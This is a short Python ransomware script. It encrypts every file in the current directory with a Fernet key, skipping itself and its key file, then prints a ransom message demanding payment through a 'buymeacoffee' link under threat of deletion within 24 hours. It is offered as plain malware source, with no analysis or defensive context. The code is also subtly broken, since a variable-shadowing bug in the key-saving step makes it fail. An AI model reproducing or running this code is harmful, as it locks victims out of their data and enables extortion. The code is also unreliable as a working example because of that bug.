#!/usr/bin/env python3

# importing important libraries

import os
from cryptography.fernet import Fernet

files = []
# looping through in the directory and put them in our file list, with the exception of 
# our key, and two scripts

for file in os.listdir():
    if file == "codeworm.py" or file == 'hackcode.py' or file == 'filekey.key':
        continue
    if os.path.isfile(file):
        files.append(file)
     
# Generated key
key = Fernet.generate_key()

   
with open("filekey.key", "wb") as key:
    key.write(key)
# Encrypting all the files using our key   
for file in files:
    with open(file, 'rb') as crpfile:
        contents = crpfile.read()
    encryption = Fernet(key).encrypt(contents)
    with open(file, 'wb') as corruptedFiles:
        corruptedFiles.write(encryption)
print("""Your computer has been hacked! Buy me a coffee at ==> buymeacoffee/hacksandcodes else your
       files will be deleted within 24hrs""")
